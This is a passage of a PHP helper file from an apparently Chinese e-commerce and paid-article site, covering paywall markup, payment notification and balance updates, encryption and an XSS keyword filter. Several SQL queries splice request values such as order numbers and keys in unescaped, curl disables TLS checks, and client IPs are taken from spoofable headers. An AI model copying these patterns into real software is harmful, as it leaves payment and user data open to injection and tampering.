	$t = str_Replace("[P_resttitle]",$P_resttitle,$t);
	$t = str_Replace("[P_rest]",$P_rest,$t);
	$t = str_Replace("[P_Ntitle]",$P_Ntitle,$t);
	$t = str_Replace("[P_Nurl]",$P_Nurl,$t);
	$t = str_Replace("[P_Ptitle]",$P_Ptitle,$t);
	$t = str_Replace("[P_Purl]",$P_Purl,$t);

	if($_SESSION["M_id"]==""){
		$fh_info="";
	}else{
		if($P_selltype==0 || $P_selltype==1){
			$fh_info="<div class=\"P_address\">[自动发货] 收件邮箱：".getrs("select * from sl_member where M_id=".$_SESSION["M_id"],"M_email")." <a href=\"member/edit.php\" target=\"_balnk\">[编辑]</a></div>";
		}else{

			$sql="select * from sl_address where A_del=0 and A_mid=".$_SESSION["M_id"];
			$result = mysqli_query($conn, $sql);
			
			if (mysqli_num_rows($result) > 0) {
				while($row = mysqli_fetch_assoc($result)) {
					if($row["A_default"]==1){
						$d="checked=\"checked\"";
					}else{
						$d="";
					}
					$fh=$fh."<p><label><input type=\"radio\" name=\"A_address\" value=\"".$row["A_id"]."\" ".$d."> ".$row["A_address"]." ".$row["A_name"]." ".$row["A_phone"]."</label></p>";
				}
				$fh_info="<div class=\"P_address\">选择收货地址 <a href=\"member/address.php\" target=\"_balnk\">[编辑]</a>：".$fh."  </div>";
			}else{
				$fh_info="<div class=\"P_address\">选择收货地址 <a href=\"member/address.php\" target=\"_balnk\">[新增]</a>：<p><label><input value=\"0\" type=\"radio\" name=\"A_address\" checked=\"checked\">暂无，请点击新增</label></p> </div>";
			}
		}
	}
	$t = str_Replace("[fh_address]","<style>.P_address{padding:10px;margin:10px 0;border:dashed 1px #DDDDDD;width:100%;border-radius:10px;box-shadow:0px 2px 10px #CCCCCC}</style>".$fh_info,$t);
	return $t;
}

function buynews($color,$N_price,$id){
  global $conn,$C_n_discount,$C_n_discount2,$C_fx1,$C_fx2,$C_fx3;
  $genkey=gen_key(20);
  $sql="select * from sl_member where M_id=".intval($_SESSION["M_id"]);
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) > 0) {

      $M_viptime=$row["M_viptime"];
      $M_viplong=$row["M_viplong"];

      if($M_viplong-(time()-strtotime($M_viptime))/86400>0){
      	if($M_viplong>30000){
      		$discount=$C_n_discount2/10;
      	}else{
      		$discount=$C_n_discount/10;
      	}
        
        $fee="<b style=\"color:".$color."\">".round($N_price*$discount,2)."元</b>[<del>原价：".$N_price."元</del>]";
      }else{
        $discount=1;
        $fee="<b style=\"color:".$color."\">".$N_price."元</b>";
      }
    }else{
      $discount=1;
      $fee="<b style=\"color:".$color."\">".$N_price."元</b>";
    }

  $N_long=getrs("select * from sl_news where N_id=".$id,"N_long");
  $N_date=getrs("select * from sl_news where N_id=".$id,"N_date");
  $N_fx=getrs("select * from sl_news where N_id=".$id,"N_fx");
	if($N_long>0){
		$N_longinfo="<br>[限时收费]本文章将在<span style=\"color:$color\">".date("Y-m-d H:i:s",strtotime("+$N_long hour",strtotime($N_date)))."</span>后免费开放阅读";
	}else{
		$N_longinfo="";
	}
  $api=$api."
  <style>
  .fh100_news_box{text-align:center;width:clac(100% - 40px);max-width:600px;margin:0 auto;border-radius:10px;border:dashed 1px ".$color.";padding:20px;box-shadow:0px 2px 10px #CCCCCC;font-size:15px}
  .fh100_news_btn{color:#ffffff !important;background:".$color.";display:inline-block;margin-top:10px;border-radius:10px;border:solid 1px ".$color.";padding:0 10px;font-size:15px}
  .fh100_news_btn:hover{color:".$color." !important;background:#ffffff;border:solid 1px ".$color.";}
  .fh100_qr_buy{display:inline-block;vertical-align:top;width:100px;margin-right:15px;}
  .fh100_qr_buy div{font-size:12px;}
  .fh100_news_buy{display:inline-block}
  .fh100_news_buy a{text-align:center}
  </style>";
  $api=$api."<form action=\"buy.php?type=newsinfo&id=$id\" method=\"post\">
        <div class=\"fh100_news_box\">";
		if(!isMobile()){
			$api=$api."<div class=\"fh100_qr_buy\">
		        	<div id=\"billImage\"></div>
		        	<div>扫码免登录支付</div>
		        </div>";
		}
        $api=$api."<div class=\"fh100_news_buy\">
        <div>本文章为付费文章，是否支付".$fee."后完整阅读？</div>
        <p style=\"font-size:12px;color:#AAAAAA\">如果您已购买过该文章，<a href=\"member/login.php?from=".urlencode("../?type=newsinfo&id=$id")."\">[登录帐号]</a>后即可查看".$N_longinfo."</p>
        <input type=\"hidden\" name=\"genkey\" value=\"$genkey\">
        <button class=\"fh100_news_btn\">支付".round($N_price*$discount,2)."元</button>";
        if(intval($_SESSION["M_id"])==0){
        	$api=$api." <button onclick=\"window.location.href='member/unlogin.php?type=news&id=$id&genkey=$genkey'\" class=\"fh100_news_btn\" type=\"button\">免登录支付</button>";
        }

		if($N_fx==1 && ($C_fx1>0 || $C_fx2>0 || $C_fx3>0) ){
			 $api=$api." <button onclick=\"window.location.href='conn/poster.php?type=news&id=$id&from=".intval($_SESSION["M_id"])."'\" class=\"fh100_news_btn\" type=\"button\">赚佣金</button>";
		}

        $api=$api."</div>
        </div>
        </form>";
	if(!isMobile()){
		$api=$api."<script src=\"js/qrcode.min.js\"></script>
		<script>
		var qrcode = new QRCode('billImage', {width: 100,height: 100,colorDark: '#000000',colorLight: '#ffffff',correctLevel: QRCode.CorrectLevel.H});
		qrcode.makeCode(\"".gethttp().splitx($_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'],"index.php",0)."member/unlogin.php?type=news&id=$id&genkey=$genkey\");
		</script>";
	}
$api=$api."<script>
function news_post(){
	$.post(\"member/unlogin.php?type=checkbuy&id=$id\",
    {
      genkey:\"$genkey\",
    },
  function(data){
  if(data==1){
  	window.location.href=\"./?type=newsinfo&id=$id&genkey=$genkey\";
  }
    });
}
setInterval(\"news_post()\",3000);
</script>";
  return $api;
}

function unlogin_product($class,$id,$genkey='a'){
	global $conn,$C_fx1,$C_fx2,$C_fx3;
	if($genkey=="a"){
		$genkey=gen_key(20);
	}

	$sql="select * from sl_product where P_id=".intval($id);
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	$P_price=p($row["P_price"]);
	$P_unlogin=$row["P_unlogin"];
	$P_fx=$row["P_fx"];
	$P_taobao=$row["P_taobao"];
/*
	if($P_unlogin==1 && $_SESSION["M_id"]==""){
		$unlogin="<button type=\"button\" onclick=\"window.location.href='member/unlogin.php?type=product&id=$id&genkey=$genkey&no='+\$('[name=no]').val()\" class=\"$class\" target=\"_blank\">免登录购买</button>";
	}else{
		$unlogin="";
	}
*/
	if($P_price>0){
		$unlogin=$unlogin." <button class=\"$class\" onclick=\"addcart()\" type=\"button\">加入购物车</button>";
	}
	if(splitx($P_taobao,"|",1)!=""){
		$unlogin=$unlogin." <a class=\"$class\" href=\"".splitx($P_taobao,"|",1)."\" target=\"_blank\">演示地址</a>";
	}
/*
	if($P_fx==1 && $P_price>0 && ($C_fx1>0 || $C_fx2>0 || $C_fx3>0)){
		$unlogin=$unlogin." <button type=\"button\" onclick=\"javascript:window.location.href='conn/poster.php?type=product&id=$id&from=".intval($_SESSION["M_id"])."'\" class=\"$class\" target=\"_blank\">赚佣金</button>";
	}
*/
	$info=$unlogin."<input type=\"hidden\" name=\"genkey\" value=\"$genkey\">";
	if(splitx($P_taobao,"|",0)==""){
		return $info;
	}else{
		return "<div style=\"display:inline-block;font-size:12px;vertical-align:bottom\">说明：将会跳转到<a href=\"".splitx($P_taobao,"|",0)."\" target=\"_blank\">外部链接</a>购买</div>";
	}
}

function unlogin_product_qr($id,$genkey='a'){
	if($genkey=="a"){
		$genkey=gen_key(20);
	}
	$info="https://static.websiteonline.cn/website/qr/index.php?url=".urlencode(gethttp().splitx($_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'],"index.php",0)."member/unlogin.php?type=product&id=".$id."&genkey=".$genkey);
	return $info;
}

function getrs($sqlx,$valuex=""){
	global $conn;
	$resultx = mysqli_query($conn,$sqlx);
	$rowx = mysqli_fetch_assoc($resultx);
	if (mysqli_num_rows($resultx) > 0) {
		if($valuex==""){
			return $rowx;
		}else{
			return $rowx[$valuex];
		}
	}else{
		return "";
	}
}

function gen_key($length,$type=1) { 
	switch ($type){
		case 1:
		$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; 
		break;
		case 2:
		$chars = '0123456789'; 
		break;
		case 3:
		$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
		break;
		default:
		$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; 
	}

	$password = ''; 
	for ( $i = 0; $i < $length; $i++ ) { 
	$password .= $chars[ mt_rand(0, strlen($chars) - 1) ]; 
	} 
	return $password; 
} 

function diffBetweenTwoDays ($day1, $day2)
{
  $second1 = strtotime($day1);
  $second2 = strtotime($day2);

  return round(($second2 - $second1) / 86400,0);
}

function splitx($a,$b,$c){
	$d=explode($b,$a);
	return $d[$c];
}

function GetBody($url, $xml,$method='POST'){    
    $second = 30;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_TIMEOUT, $second);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,false);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    $data = curl_exec($ch);
    if($data){
      curl_close($ch);
      return $data;
    } else { 
      $error = curl_errno($ch);
      curl_close($ch);
      return false;
    }
}

function isMobile() {
  // 如果有HTTP_X_WAP_PROFILE则一定是移动设备
  if (isset($_SERVER['HTTP_X_WAP_PROFILE'])) {
    return true;
  }
  // 如果via信息含有wap则一定是移动设备,部分服务商会屏蔽该信息
  if (isset($_SERVER['HTTP_VIA'])) {
    // 找不到为flase,否则为true
    return stristr($_SERVER['HTTP_VIA'], "wap") ? true : false;
  }
  // 脑残法，判断手机发送的客户端标志,兼容性有待提高。其中'MicroMessenger'是电脑微信
  if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $clientkeywords = array('nokia','sony','ericsson','mot','samsung','htc','sgh','lg','sharp','sie-','philips','panasonic','alcatel','lenovo','iphone','ipod','blackberry','meizu','android','netfront','symbian','ucweb','windowsce','palm','operamini','operamobi','openwave','nexusone','cldc','midp','wap','mobile','MicroMessenger');
    // 从HTTP_USER_AGENT中查找手机浏览器的关键字
    if (preg_match("/(" . implode('|', $clientkeywords) . ")/i", strtolower($_SERVER['HTTP_USER_AGENT']))) {
      return true;
    }
  }
  // 协议法，因为有可能不准确，放到最后判断
  if (isset ($_SERVER['HTTP_ACCEPT'])) {
    // 如果只支持wml并且不支持html那一定是移动设备
    // 如果支持wml和html但是wml在html之前则是移动设备
    if ((strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') !== false) && (strpos($_SERVER['HTTP_ACCEPT'], 'text/html') === false || (strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') < strpos($_SERVER['HTTP_ACCEPT'], 'text/html')))) {
      return true;
    }
  }
  return false;
}

function isWeixin() {
  if (strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') !== false) {
    return true;
  } else {
    return false;
  }
}

function getip(){
    static $realip;
    if (isset($_SERVER)){
        if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])){
            $realip = $_SERVER["HTTP_X_FORWARDED_FOR"];
        } else if (isset($_SERVER["HTTP_CLIENT_IP"])) {
            $realip = $_SERVER["HTTP_CLIENT_IP"];
        } else {
            $realip = $_SERVER["REMOTE_ADDR"];
        }
    } else {
        if (getenv("HTTP_X_FORWARDED_FOR")){
            $realip = getenv("HTTP_X_FORWARDED_FOR");
        } else if (getenv("HTTP_CLIENT_IP")) {
            $realip = getenv("HTTP_CLIENT_IP");
        } else {
            $realip = getenv("REMOTE_ADDR");
        }
    }
    return $realip;
}

Function DateAdd($part, $n, $date,$type="Y-m-d"){
switch($part){
case "y": $val = date($type, strtotime($date ." +$n year")); break;
case "m": $val = date($type, strtotime($date ." +$n month")); break;
case "w": $val = date($type, strtotime($date ." +$n week")); break;
case "d": $val = date($type, strtotime($date ." +$n day")); break;
case "h": $val = date($type, strtotime($date ." +$n hour")); break;
case "n": $val = date($type, strtotime($date ." +$n minute")); break;
case "s": $val = date($type, strtotime($date ." +$n second")); break;
}
return $val;
}

function box($B_text,$B_url,$B_type){
if ($B_url=="back"){
	echo "<script>alert('".$B_text."');history.back();</script>";
}else{
	echo "<script>alert('".$B_text."');window.location.href='".$B_url."';</script>";
}
die();
}

function geturl(){
	return gethttp().$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
}

function CopyMyFolder($source, $dest){
    if (!file_exists($dest)) mkdir($dest);
    $handle = opendir($source);
    while (($item = readdir($handle)) !== false) {
        if ($item == '.' || $item == '..') continue;
        $_source = $source . '/' . $item;
        $_dest = $dest . '/' . $item;
        if (is_file($_source)) copy($_source, $_dest);
        if (is_dir($_source)) CopyMyFolder($_source, $_dest);
    }
    closedir($handle);
}


function DeleteFolder($path){
    $handle = opendir($path);
    while (($item = readdir($handle)) !== false) {
        if ($item == '.' || $item == '..') continue;
        $_path = $path . '/' . $item;
        if (is_file($_path)) unlink($_path);
        if (is_dir($_path)) DeleteFolder($_path);
    }
    closedir($handle);
    return rmdir($path);
}

function t($str){
    $str=str_replace("\t","_",$str);
    $str=str_replace(" ","_",$str);
    $str=str_replace("(","_",$str);
    $str=str_replace(")","_",$str);
    $str=str_replace("<","_",$str);
    $str=str_replace(">","_",$str);
    $str=str_replace("/*","",$str);
    $str=str_replace("*/","",$str);
    $str=str_replace("#","",$str);
    $str=str_replace("-- ","",$str);
    $str=str_replace("'","‘",$str);
    $str=str_replace("\"","“",$str);
    return $str;
}


function CheckFields($myTable,$myFields){
	global $conn;
	$field = mysqli_query($conn,"Describe ".$myTable." ".$myFields);  
	$field = mysqli_fetch_array($field);  
	if($field[0]){  
		return 1;
	}else{
		return 0;
	}
}

function CheckTables($myTable){
	global $conn;
	$field = mysqli_query($conn,"SHOW TABLES LIKE '". $myTable."'");  
	$field = mysqli_fetch_array($field);  
	if($field[0]){  
		return 1;
	}else{
		return 0;
	}
}

function enname($name){
	if($name=="未登录帐号"){
		return "免登录购买";
	}else{
		return mb_substr($name,0,1,"utf-8")."***";
	}
	
}

function xcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
    $ckey_length = 4;   
    $key = md5($key ? $key : $GLOBALS['discuz_auth_key']);   
    $keya = md5(substr($key, 0, 16));   
    $keyb = md5(substr($key, 16, 16));   
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length):substr(md5(microtime()), -$ckey_length)) : '';    
    $cryptkey = $keya.md5($keya.$keyc);   
    $key_length = strlen($cryptkey);   
    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;   
    $string_length = strlen($string);   
    $result = '';   
    $box = range(0, 255);   
    $rndkey = array();     
    for($i = 0; $i <= 255; $i++) {   
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);   
    }    
    for($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }   
    for($a = $j = $i = 0; $i < $string_length; $i++) {   
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;   
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }
    if($operation == 'DECODE') {   
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {   
            return substr($result, 26);   
        } else {   
            return '';   
        }   
    } else { 
        return $keyc.str_replace('=', '', base64_encode($result));   
    }   
}

function removeDir($dirName) 
{ 
    if(! is_dir($dirName)) 
    { 
        return false; 
    } 
    $handle = @opendir($dirName); 
    while(($file = @readdir($handle)) !== false) 
    { 
        if($file != '.' && $file != '..') 
        { 
            $dir = $dirName . '/' . $file; 
            is_dir($dir) ? removeDir($dir) : @unlink($dir); 
        } 
    } 
    closedir($handle); 
      
    return rmdir($dirName) ; 
} 

function notify($no,$type,$id,$genkey,$email,$num,$M_id,$money,$D_domain,$paytype,$no2=''){
	global $conn,$C_n_discount,$C_p_discount,$C_n_discount2,$C_p_discount2,$C_email,$C_fx1,$C_fx2,$C_fx3,$C_mobile,$C_smssign,$C_dx5,$fmid;
	if($money<0 || $num<1){
		return false;//订单金额错误或数量错误
	}else{
		$sql="select * from sl_member where M_id=".intval($M_id);
	    $result = mysqli_query($conn, $sql);
	    $row = mysqli_fetch_assoc($result);
	    $M_id=$row["M_id"];
	    $M_email=$row["M_email"];
	    $M_money=$row["M_money"];
	    $M_viptime=$row["M_viptime"];
	    $M_viplong=$row["M_viplong"];

	    if($M_viplong-(time()-strtotime($M_viptime))/86400>0){
	        $M_vip=1;
	        if($M_viplong>30000){
	        	$N_discount=$C_n_discount2/10;
	        	$P_discount=$C_p_discount2/10;
	        }else{
	        	$N_discount=$C_n_discount/10;
	        	$P_discount=$C_p_discount/10;
	        }
	    }else{
	        $M_vip=0;
	        $N_discount=1;
	        $P_discount=1;
	    }

		$sql = "select * from sl_list where L_no='" . $no . "'";
	    $result = mysqli_query($conn, $sql);
	    $row = mysqli_fetch_assoc($result);
	    if (mysqli_num_rows($result) <= 0) {
	        
	        if($type=="news"){
				$sql2="select * from sl_news where N_del=0 and N_id=".$id;
				$result2 = mysqli_query($conn, $sql2);
				$row2 = mysqli_fetch_assoc($result2);
				if (mysqli_num_rows($result2) > 0) {
					$N_title=$row2["N_title"];
					$N_pic=$row2["N_pic"];
					$N_price=p($row2["N_price"]*$N_discount);
					$N_price2=round($row2["N_price2"]*$N_discount,2);
					$N_mid=$row2["N_mid"];
					$N_fx=$row2["N_fx"];
				}
				if($N_price==$money){

					if($paytype=="余额支付"){
						mysqli_query($conn, "update sl_member set M_money=M_money-$money where M_id=$M_id");
					}else{
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($M_id,'$no','帐号充值','".date('Y-m-d H:i:s')."',".$money.",'$genkey')");
					}
					
					mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey,L_no2) values($M_id,'$no','文章付费阅读','".date('Y-m-d H:i:s')."',-".$money.",'$genkey','$no2')");

					//mysqli_query($conn, "insert into sl_orders(O_nid,O_mid,O_time,O_type,O_price,O_num,O_title,O_pic,O_state,O_address,O_content,O_genkey,O_sellmid) values($id,$M_id,'".date('Y-m-d H:i:s')."',1,$money,1,'$N_title','$N_pic',1,'$email','$genkey','$genkey',$N_mid)");

					mysqli_query($conn, "update sl_orders set O_state=1 where O_genkey='$genkey'");
					if($N_mid!=$M_id){
						mysqli_query($conn, "update sl_member set M_fen=M_fen+$money where M_id=$M_id");
					}
					if($N_mid>0){
						mysqli_query($conn, "update sl_member set M_money=M_money+".$money." where M_id=$N_mid");
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($N_mid,'".date('YmdHis').rand(10000000,99999999)."','售出文章-".$N_title."','".date('Y-m-d H:i:s')."',$money,'')");
					}
					if($fmid>0 && $N_mid==0){//只有主站文章加提成
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($fmid,'$no','售出文章','".date('Y-m-d H:i:s')."',".$money.",'$genkey')");
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($fmid,'$no','扣除成本','".date('Y-m-d H:i:s')."',-".$N_price2.",'$genkey')");
						mysqli_query($conn, "update sl_member set M_money=M_money+".($money-$P_price2)." where M_id=$fmid");
					}
					if($N_fx==1){
						fx($money,$M_id,$N_mid);
					}
					sendmail("查收您的付费阅读文章", "<p>感谢您购买文章《".$N_title."》阅读</p><p>阅读链接：http://".$D_domain."/?type=newsinfo&id=".$id."&genkey=".$genkey."</p><p>订单编号；".$genkey."</p>", getrs("select O_address from sl_orders where O_genkey='$genkey'","O_address"));
				}
				sendmail("有用户通过".$paytype."阅读文章","用户ID：".$M_id."<br>文章名称：".$N_title."<br>订单金额：".$money."元<br>交易单号：".$no,$C_email);
				if($C_dx5==1){
					sendsms("【".$C_smssign."】有用户通过".$paytype."阅读文章，用户ID：".$M_id."，文章名称：".$N_title."，订单金额：".$money."元，交易单号：".$no,$C_mobile);
				}
	        }else{
				$sql2="select * from sl_product where P_del=0 and P_id=".$id;
				$result2 = mysqli_query($conn, $sql2);
				$row2 = mysqli_fetch_assoc($result2);
				if (mysqli_num_rows($result2) > 0) {
					$P_title=$row2["P_title"];
					$P_pic=$row2["P_pic"];
					$P_sell=$row2["P_sell"];
					$P_selltype=$row2["P_selltype"];
					if($row2["P_vip"]==1){
						$P_price=p($row2["P_price"]*$P_discount);
						$P_price2=round($row2["P_price2"]*$P_discount,2);
					}else{
						$P_price=p($row2["P_price"]);
						$P_price2=round($row2["P_price2"],2);
					}
					
					$P_mid=$row2["P_mid"];
					$P_fx=$row2["P_fx"];
				}
				if(round($P_price*$num,2)==round($money,2)){
					switch($P_selltype){
					  	case 0:
					  		$O_content=$P_sell;
					  		$O_address=getrs("select O_address from sl_orders where O_genkey='$genkey'","O_address");
					  		$O_state=1;
					  	break;
					  	case 1:
					  		for($i=0;$i<$num;$i++){
								$C_id=getrs("select * from sl_card where C_del=0 and C_use=0 and C_sort=".intval($P_sell),"C_id");
								$C_content=getrs("select * from sl_card where C_id=".intval($C_id),"C_content");
								if($C_content==""){
									$O_content=$O_content."商品缺货，请联系客服||";
								}else{
									$O_content=$O_content.$C_content."||";
								}
								mysqli_query($conn,"update sl_card set C_use=1 where C_id=".intval($C_id));
							}
							$O_content=substr($O_content,0,strlen($O_content)-2);
							$O_address=getrs("select O_address from sl_orders where O_genkey='$genkey'","O_address");
							$O_state=1;
					  	break;
					  	case 2:
					  		mysqli_query($conn,"update sl_product set P_rest=P_rest-$num where P_id=".$id);
					  		$O_content="实物商品，由商家手动发货";
					  		$O_address=getrs("select O_address from sl_orders where O_genkey='$genkey'","O_address");
					  		$O_state=2;
					  	break;
					}
				
					mysqli_query($conn, "update sl_product set P_sold=P_sold+$num where P_id=".$id);
					if($paytype=="余额支付"){
						mysqli_query($conn, "update sl_member set M_money=M_money-$money where M_id=$M_id");
					}else{
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($M_id,'$no','帐号充值','".date('Y-m-d H:i:s')."',".$money.",'$genkey')");
					}
					if($P_mid!=$M_id){
						mysqli_query($conn, "update sl_member set M_fen=M_fen+$money where M_id=$M_id");
					}
					
					mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey,L_no2) values($M_id,'$no','购买商品','".date('Y-m-d H:i:s')."',-".$money.",'$genkey','$no2')");
					//mysqli_query($conn, "insert into sl_orders(O_pid,O_mid,O_time,O_type,O_price,O_num,O_content,O_title,O_pic,O_address,O_state,O_genkey,O_sellmid) values($id,$M_id,'".date('Y-m-d H:i:s')."',0,$P_price,$num,'$O_content','$P_title','$P_pic','$O_address',$O_state,'$genkey',$P_mid)");
					//
					mysqli_query($conn, "update sl_orders set O_state=$O_state,O_content='$O_content' where O_genkey='$genkey'");

					if($fmid>0 && $P_mid==0){//只有主站商品加提成
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($fmid,'$no','售出商品','".date('Y-m-d H:i:s')."',".$money.",'$genkey')");
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($fmid,'$no','扣除成本','".date('Y-m-d H:i:s')."',-".($P_price2*$num).",'$genkey')");
						mysqli_query($conn, "update sl_member set M_money=M_money+".($money-($P_price2*$num))." where M_id=$fmid");
					}

					if($P_mid>0){
						mysqli_query($conn, "update sl_member set M_money=M_money+".$money." where M_id=$P_mid");
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($P_mid,'".date('YmdHis').rand(10000000,99999999)."','售出商品-".$P_title."','".date('Y-m-d H:i:s')."',$money,'')");
					}

					if($P_fx==1){
						fx($money,$M_id,$P_mid);
					}
					
					if(checkauth()){
						plug("x4","../../conn/plug/");
						require "../../conn/plug/x4.php";
					}
					sendmail("您的购买的商品已发货","<p>商品名称：".$P_title."</p><p>发货内容：".$O_content."</p><p>订单编号：".$no."</p>",splitx($O_address,"__",0));
				}
				sendmail("有用户通过".$paytype."购物","用户ID：".$M_id."<br>商品名称：".$P_title."<br>订单金额：".$money."元<br>交易单号：".$no,$C_email);
				if($C_dx5==1){
					sendsms("【".$C_smssign."】有用户通过".$paytype."购物，用户ID：".$M_id."，商品名称：".$P_title."，订单金额：".$money."元，交易单号：".$no,$C_mobile);
				}
	        }
		    return true;
	    }else{
	    	return false;
	    }
	}
}


function fx($money,$M_id,$P_mid){
	global $C_fx1,$C_fx2,$C_fx3,$conn;
	$genkey=gen_key(20);

	if(checkauth()){
		plug("x2","../../conn/plug/");
		require "../../conn/plug/x2.php";
	}
}
function fx_vip($money,$M_id,$P_mid){
	global $C_fx1,$C_fx2,$C_fx3,$conn;
	$genkey=gen_key(20);

	if(checkauth()){
		plug("x2","../conn/plug/");
		require "../conn/plug/x2.php";
	}
}
function removexss($val) {
    $val = preg_replace ( '/([\x00-\x08\x0b-\x0c\x0e-\x19])/', '', $val );

    $search = 'abcdefghijklmnopqrstuvwxyz';
    $search .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $search .= '1234567890!@#$%^&*()';
    $search .= '~`";:?+/={}[]-_|\'\\';
    for($i = 0; $i < strlen ( $search ); $i ++) {

        $val = preg_replace ( '/(&#[xX]0{0,8}' . dechex ( ord ( $search [$i] ) ) . ';?)/i', $search [$i], $val );

        $val = preg_replace ( '/(&#0{0,8}' . ord ( $search [$i] ) . ';?)/', $search [$i], $val );
    }

    $ra1 = array (
        'javascript',
        'vbscript',
        'expression',
        'applet',
        'meta',
        'xml',
        'blink',
        'script',
        'object',
        'iframe',
        'frame',
        'frameset',
        'ilayer',
        'bgsound'
    );
    $ra2 = array (
        'onabort',
        'onactivate',
        'onafterprint',
        'onafterupdate',
        'onbeforeactivate',
        'onbeforecopy',
        'onbeforecut',
        'onbeforedeactivate',
        'onbeforeeditfocus',
        'onbeforepaste',
        'onbeforeprint',
        'onbeforeunload',
        'onbeforeupdate',
        'onbegin',
        'onblur',
        'onbounce',
        'oncellchange',
        'onchange',
        'onclick',
        'oncontextmenu',
        'oncontrolselect',
        'oncopy',
        'oncut',
        'ondataavailable',
        'ondatasetchanged',
        'ondatasetcomplete',
        'ondblclick',
        'ondeactivate',
        'ondrag',
        'ondragend',
        'ondragenter',
        'ondragleave',
        'ondragover',
        'ondragstart',
        'ondrop',
        'onerror',
        'onerrorupdate',
        'onfilterchange',
        'onfinish',
        'onfocus',
        'onfocusin',
        'onfocusout',
        'onhelp',
        'onkeydown',
        'onkeypress',
        'onkeyup',
        'onlayoutcomplete',
        'onload',
        'onlosecapture',
        'onmousedown',
        'onmouseenter',
        'onmouseleave',
        'onmousemove',
        'onmouseout',
        'onmouseover',
        'onmouseup',
        'onmousewheel',
        'onmove',
        'onmoveend',
        'onmovestart',
        'onpaste',
        'onpropertychange',
        'onreadystatechange',
        'onreset',
        'onresize',
        'onresizeend',
        'onresizestart',
        'onrowenter',
        'onrowexit',
        'onrowsdelete',
        'onrowsinserted',
        'onscroll',
        'onselect',
        'onselectionchange',
        'onselectstart',
        'onstart',
        'onstop',
        'onsubmit',
        'ontoggle',
        'onunload'
    );
    $ra = array_merge ( $ra1, $ra2 );

    $found = true;
    while ( $found == true ) {
        $val_before = $val;
        for($i = 0; $i < sizeof ( $ra ); $i ++) {
            $pattern = '/';
            for($j = 0; $j < strlen ( $ra [$i] ); $j ++) {
                if ($j > 0) {
                    $pattern .= '(';
                    $pattern .= '(&#[xX]0{0,8}([9ab]);)';
                    $pattern .= '|';
                    $pattern .= '|(&#0{0,8}([9|10|13]);)';
                    $pattern .= ')*';
                }
                $pattern .= $ra [$i] [$j];
            }
            $pattern .= '/i';
            $replacement = substr ( $ra [$i], 0, 2 ) . ' ' . substr ( $ra [$i], 2 );
            $val = preg_replace ( $pattern, $replacement, $val );
            if ($val_before == $val) {

                $found = false;
            }
        }
    }
    return $val;
}

function gethttp(){
    if (is_ssl()){
        $gethttp="https://";
    }else{
        $gethttp="http://";
    }
    return $gethttp;
}


function is_ssl() {
    global $config;
    if($config->https=="true"){
        return true;
    }else{
        if(isset($_SERVER['HTTPS']) && ('1' == $_SERVER['HTTPS'] || 'on' == strtolower($_SERVER['HTTPS']))){
            return true;
        }else{
            if(isset($_SERVER['SERVER_PORT']) && ('443' == $_SERVER['SERVER_PORT'] )) {
                return true;
            }else{
                if(isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && ('https' == $_SERVER['HTTP_X_FORWARDED_PROTO'] )) {
                    return true;
                }else{
                    if(isset($_SERVER['HTTP_FROM_HTTPS']) && ('on' == $_SERVER['HTTP_FROM_HTTPS'] )) {
                        return true;
